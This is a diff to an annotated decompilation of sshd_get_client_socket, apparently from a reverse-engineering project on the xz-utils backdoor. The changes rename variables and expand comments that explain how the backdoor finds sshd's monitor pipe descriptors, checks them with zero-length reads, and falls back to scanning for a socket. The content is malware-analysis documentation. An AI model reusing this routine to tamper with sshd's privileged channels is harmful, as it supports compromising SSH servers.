@@ -5,10 +5,7 @@
 
 
 /*
- * AutoDoc: Prefers the recovered monitor struct when one is available: it selects monitor->child_to_monitor_fd for DIR_WRITE and
- * monitor->monitor_to_child_fd for DIR_READ, verifies the descriptor by issuing a zero-length `read()` that tolerates EINTR, and
- * returns it on success. If the monitor pointer is unmapped or the fd is dead/EBADF it falls back to
- * `sshd_get_usable_socket`, letting callers still obtain a socket handle by index.
+ * AutoDoc: Prefers sshd’s monitor struct when it has already been located: the helper validates that the pointer is still mapped, selects `child_to_monitor_fd` or `monitor_to_child_fd` based on the requested direction, and probes the descriptor with a zero-length `read()` (retrying on EINTR but rejecting EBADF). If the monitor is missing or the fd is dead it falls back to `sshd_get_usable_socket` and hands back the Nth idle descriptor instead.
  */
 
 #include "xzre_types.h"
@@ -18,50 +15,55 @@ BOOL sshd_get_client_socket
 
 {
   monitor *monitor_candidate;
-  BOOL range_ok;
+  BOOL monitor_mapped;
   ssize_t read_result;
   int *errno_ptr;
-  libc_imports_t *imports;
-  int socket_fd;
+  libc_imports_t *libc_imports;
+  int client_fd;
   u8 read_probe_buf[9];
   
   if (((ctx == (global_context_t *)0x0) ||
-      (imports = ctx->libc_imports, imports == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
+      (libc_imports = ctx->libc_imports, libc_imports == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
     return FALSE;
   }
   if (ctx->monitor_struct_slot != (monitor **)0x0) {
+    // AutoDoc: Use the recovered monitor struct when one was published through `global_context_t`.
     monitor_candidate = *ctx->monitor_struct_slot;
-    range_ok = is_range_mapped((u8 *)monitor_candidate,4,ctx);
-    if (range_ok != FALSE) {
+    // AutoDoc: Skip the monitor path entirely if the cached pointer is unmapped or stale.
+    monitor_mapped = is_range_mapped((u8 *)monitor_candidate,4,ctx);
+    if (monitor_mapped != FALSE) {
+      // AutoDoc: DIR_WRITE expects the child→monitor pipe; DIR_READ grabs the monitor→child side.
       if (socket_direction == DIR_WRITE) {
-        socket_fd = monitor_candidate->child_to_monitor_fd;
+        client_fd = monitor_candidate->child_to_monitor_fd;
       }
       else {
         if (socket_direction != DIR_READ) {
           return FALSE;
         }
-        socket_fd = monitor_candidate->monitor_to_child_fd;
+        client_fd = monitor_candidate->monitor_to_child_fd;
       }
       read_probe_buf[0] = 0;
-      imports = ctx->libc_imports;
-      if (((-1 < socket_fd) && (imports != (libc_imports_t *)0x0)) &&
-         ((imports->read != (pfn_read_t)0x0 &&
-          (imports->__errno_location != (pfn___errno_location_t)0x0)))) {
+      libc_imports = ctx->libc_imports;
+      if (((-1 < client_fd) && (libc_imports != (libc_imports_t *)0x0)) &&
+         ((libc_imports->read != (pfn_read_t)0x0 &&
+          (libc_imports->__errno_location != (pfn___errno_location_t)0x0)))) {
         do {
-          read_result = (*imports->read)(socket_fd,read_probe_buf,0);
-          errno_ptr = (*imports->__errno_location)();
+          // AutoDoc: Issue a zero-length read to confirm the fd is alive, retrying on EINTR but treating EBADF as fatal.
+          read_result = (*libc_imports->read)(client_fd,read_probe_buf,0);
+          errno_ptr = (*libc_imports->__errno_location)();
           if (-1 < (int)read_result) goto LAB_00107d34;
         } while (*errno_ptr == 4);
         if (*errno_ptr != 9) {
 LAB_00107d34:
-          *pSocket = socket_fd;
+          *pSocket = client_fd;
           return TRUE;
         }
       }
     }
-    imports = ctx->libc_imports;
+    libc_imports = ctx->libc_imports;
   }
-  range_ok = sshd_get_usable_socket(pSocket,socket_index,imports);
-  return range_ok;
+  // AutoDoc: Fall back to the brute-force fd scanner when the monitor probe failed.
+  monitor_mapped = sshd_get_usable_socket(pSocket,socket_index,libc_imports);
+  return monitor_mapped;
 }
 
